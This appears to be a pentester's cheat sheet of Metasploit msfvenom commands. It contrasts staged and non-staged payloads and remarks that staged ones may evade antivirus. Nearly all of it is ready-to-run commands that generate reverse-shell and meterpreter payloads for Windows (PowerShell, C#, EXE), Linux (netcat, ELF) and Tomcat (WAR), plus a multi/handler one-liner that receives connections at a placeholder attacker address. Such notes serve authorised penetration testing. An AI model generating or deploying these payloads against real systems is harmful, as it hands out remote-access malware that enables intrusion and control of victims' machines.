## Non-Staged Payloads

e.g. `windows/shell_reverse_tcp`
- Contains all the code needed to connect to attackers machine
- Works with NC & Multihandler

## Staged Payloads

e.g. `windows/shell/reverse_tcp`
- Contains minimum amount of code to perform a call back
- Does not take up as much memory
- May evade anti-virus
- Works with Multihandler only

# Windows

PowerShell:

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f ps1
```

Csharp:

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f csharp
```

EXE:

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f exe > shell.exe
```

Multi-Handler:

```bash
sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST x.x.x.x;set LPORT 443;run;"
```
# Linux

Netcat

```bash
sudo msfvenom -p cmd/unix/reverse_netcat lhost=x.x.x.x lport=443
```

32 Bit:

```bash
sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=443 -f elf > shell.elf
```
 
 64 Bit:

```bash
sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=443 -f elf > shell.elf
```

# Tomcat WAR

```bash
sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -f war -o revshell.war
```
